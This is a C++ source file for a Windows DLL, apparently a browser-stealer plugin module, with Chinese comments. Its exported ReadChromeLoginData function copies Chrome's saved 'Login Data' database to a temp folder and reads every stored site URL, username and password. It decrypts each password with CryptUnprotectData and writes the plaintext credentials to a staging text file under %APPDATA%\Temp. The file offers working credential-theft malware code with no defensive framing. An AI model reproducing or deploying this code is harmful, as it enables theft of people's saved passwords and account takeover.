// ChromePlugin.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include "ChromePlugin.h"

#include "sqlite3.h"
#include <Windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <iostream>
#include <Wincrypt.h>

#pragma comment (lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32")

#include <cstring>


// 这是导出变量的一个示例
CHROMEPLUGIN_API int nChromePlugin=0;

// 这是导出函数的一个示例。
CHROMEPLUGIN_API int fnChromePlugin(void)
{
    return 42;
}

// 这是已导出类的构造函数。
// 有关类定义的信息，请参阅 ChromePlugin.h
CChromePlugin::CChromePlugin()
{


    return;
}
#define DATA_FILE_PATH "%APPDATA%\\Temp"

char Data_File_Path[MAX_PATH] = { 0 };

extern "C" CHROMEPLUGIN_API void  ReadChromeLoginData(DWORD ID)
{
	string strPath;
	char tempPath[MAX_PATH];

	memset(tempPath, 0, MAX_PATH);
	memset(Data_File_Path, 0, MAX_PATH);

	sprintf(tempPath, "%s\\%d\\", DATA_FILE_PATH, ID);

	ExpandEnvironmentStringsA(tempPath, Data_File_Path, MAX_PATH);
	char szFilePath[MAX_PATH] = { 0 };
	sprintf(szFilePath, "%s\\ChromePlugin.txt", Data_File_Path);
	strPath = szFilePath;


	string sLoginDataPath;
	char szPath[MAX_PATH] = { 0 };
	SHGetSpecialFolderPathA(NULL, szPath, CSIDL_LOCAL_APPDATA, FALSE);
	sLoginDataPath = szPath;
	sLoginDataPath.append("\\Google\\Chrome\\User Data\\Default\\Login Data");

	WIN32_FIND_DATAA FileData = {};
	HANDLE hFindFile = FindFirstFileA(sLoginDataPath.c_str(), &FileData);
	if (hFindFile != INVALID_HANDLE_VALUE)
	{
		FindClose(hFindFile);
		
		wstring buffcherome = ReadEncryptData(sLoginDataPath);


		char * filepath = const_cast<char*>(strPath.c_str());

		SaveToFile(filepath, buffcherome);

			
	}
	else
	{
		return;
	}


}

wchar_t * ANSIToUnicode(const char* str)
{
	int textlen;
	wchar_t * result;
	textlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	result = (wchar_t *)malloc((textlen + 1) * sizeof(wchar_t));
	memset(result, 0, (textlen + 1) * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, -1, (LPWSTR)result, textlen);
	return result;
}

char * UnicodeToUTF8(const wchar_t* str)
{
	char* result;
	int textlen;
	textlen = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
	result = (char *)malloc((textlen + 1) * sizeof(char));
	memset(result, 0, sizeof(char) * (textlen + 1));
	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, textlen, NULL, NULL);
	return result;
}
char*ANSIToUTF8(const char* str)
{
	return UnicodeToUTF8(ANSIToUnicode(str));
}

char* Utf8ToGBK(char* strUtf8, char *szGBK)
{
	int len = MultiByteToWideChar(CP_UTF8, 0, (LPCCH)strUtf8, -1, NULL, 0);
	unsigned short * wszGBK = new unsigned short[len + 1];
	memset(wszGBK, 0, len * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, (LPCCH)strUtf8, -1, (LPWSTR)wszGBK, len);
	len = WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)wszGBK, -1, NULL, 0, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, (LPCWSTR)wszGBK, -1, (LPSTR)szGBK, len, NULL, NULL);
	return szGBK;
}

// void  __fastcall ChangeCodeUTA(char * szBuf)//UTF8->Ansi
// {
// 	//路径的Ansi-->UTF8
// 
// 	//Ansi->UNICODE
// 	WCHAR*   strA;
// 	int i = MultiByteToWideChar(CP_UTF8, 0, szBuf, -1, NULL, 0);
// 	strA = new   WCHAR[i];
// 	MultiByteToWideChar(CP_UTF8, 0, szBuf, -1, strA, i);
// 	//UNICODE->UTF8
// 	i = WideCharToMultiByte(CP_ACP, 0, strA, -1, NULL, 0, NULL, NULL);
// 	char   *strB = new   char[i];
// 	WideCharToMultiByte(CP_ACP, 0, strA, -1, strB, i, NULL, NULL);
// 	sprintf(szBuf, "%s\0", strB);
// 	delete[] strA;
// 	delete[] strB;
// 
// }
wchar_t * UTF8ToUnicode(const char* str)
{
	int textlen;
	wchar_t * result;
	textlen = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
	result = (wchar_t *)malloc((textlen + 1) * sizeof(wchar_t));
	memset(result, 0, (textlen + 1) * sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, str, -1, (LPWSTR)result, textlen);
	return result;
}

bool SaveToFile(char * pPathFile, wstring strFile)
{
	FILE *filepath = fopen(pPathFile, "w+");

	if (filepath == NULL)
	{
		return false;
	}
	const wchar_t* strfilew = strFile.c_str();

	string strfileUTF;
	strfileUTF = UnicodeToUTF8(strfilew);

	fwrite(strfileUTF.c_str(), strfileUTF.length(), 1, filepath);

	fclose(filepath);

	return true;
}

wstring ReadEncryptData(const string &sLoginDataPath)
{

	wstring strBuffer = L"";

	string sTempPath;
	if (!CopyDataBaseToTempDir(sLoginDataPath, sTempPath))
		return false;

	sqlite3 *pDB = NULL;
	sqlite3_stmt *pStmt = NULL;
	int nSqliteRet;

	string strSql = "select origin_url, username_value, password_value from logins";
	nSqliteRet = sqlite3_open_v2(sTempPath.c_str(), &pDB, SQLITE_OPEN_READWRITE, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_close(pDB);
		return false;
	}

	nSqliteRet = sqlite3_prepare_v2(pDB, strSql.c_str(), strSql.length(), &pStmt, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_finalize(pStmt);
		sqlite3_close(pDB);
		return false;
	}

	do
	{
		nSqliteRet = sqlite3_step(pStmt);
		if (nSqliteRet != SQLITE_ROW)
			break;

		string sOriginUrl;
		string sUsername;
		string sPassword;
		sOriginUrl = (char *)sqlite3_column_text(pStmt, 0);
		sUsername = (CHAR *)sqlite3_column_text(pStmt, 1);
		char*aaa = (char*)sUsername.c_str();
		char*bbb = (char*)sOriginUrl.c_str();


		WCHAR*   strA;
		int i = MultiByteToWideChar(CP_UTF8, 0, aaa, -1, NULL, 0);
		strA = new   WCHAR[i];
		MultiByteToWideChar(CP_UTF8, 0, aaa, -1, strA, i);


		WCHAR *buff1 = new WCHAR[MAX_PATH];
		buff1 = ANSIToUnicode(bbb);



		DATA_BLOB dbEncryptedVal;
		dbEncryptedVal.cbData = sqlite3_column_bytes(pStmt, 2);
		dbEncryptedVal.pbData = (BYTE*)sqlite3_column_blob(pStmt, 2);

		DATA_BLOB dbOut;
		if (CryptUnprotectData(&dbEncryptedVal, NULL, NULL, NULL, NULL, 0, &dbOut))
		{
			char *pData = new char[dbOut.cbData + 1];
			memcpy(pData, dbOut.pbData, dbOut.cbData);
			pData[dbOut.cbData] = 0;
			sPassword = pData;
			delete[] pData;
		}
		char*ccc = (char*)sPassword.c_str();
		WCHAR *buff2 = new WCHAR[MAX_PATH];
		buff2 = ANSIToUnicode(ccc);

//		std::cout << "--------------------------------" << endl;
//		std::cout << "网址:" << sOriginUrl << endl;
//		std::cout << "用户名:" << sUsername << endl;
//		std::cout << "密码:" << sPassword << std::endl;

		wstring databuff;

		databuff += buff1;
		databuff += L"<?>";
		databuff += strA;
		databuff += L"<?>";
		databuff += buff2;
		databuff += L"<?>";
		databuff += L"<??>";
		strBuffer += databuff;

		delete[]strA;
		delete[]buff1;
		delete[]buff2;



	} while (true);


//	SaveToFile("c://13.txt", strBuffer);

	if (pStmt)
	{
		sqlite3_finalize(pStmt);
		pStmt = NULL;
	}
	if (pDB)
	{
		sqlite3_close(pDB);
		pDB = NULL;
	}
	
    

	return strBuffer;
}

bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath)
{
	char chTempPath[MAX_PATH];
	::GetTempPathA(MAX_PATH, chTempPath);
	if (!PathFileExistsA(sDBPath.c_str()))
		return false;

	sTempDBPath = chTempPath;
	if (sTempDBPath.empty())
		return false;

	sTempDBPath.append("chromeTmp");
	if (!CopyFileA(sDBPath.c_str(), sTempDBPath.c_str(), FALSE))
		return false;

	return true;
}

